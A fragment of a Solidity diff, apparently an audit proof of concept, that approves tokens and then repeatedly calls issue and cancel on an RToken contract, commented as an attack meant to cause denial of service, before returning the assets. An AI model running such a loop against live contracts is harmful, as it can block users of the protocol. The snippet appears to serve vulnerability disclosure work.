+            IERC20(erc20s[i]).approve(address(rToken), type(uint256).max);
+        }
+        // Attack: make RToken DoS by numerous issue
+        for (uint256 i = 0; i < round; i++) {
+            rToken.issue(amount);
+            rToken.cancel(1, true);
+        }
+        // Return assets
+        for (uint256 i = 0; i < erc20s.length; i++) {
+            IERC20(erc20s[i]).transfer(msg.sender, quantities[i]);
+        }
+    }
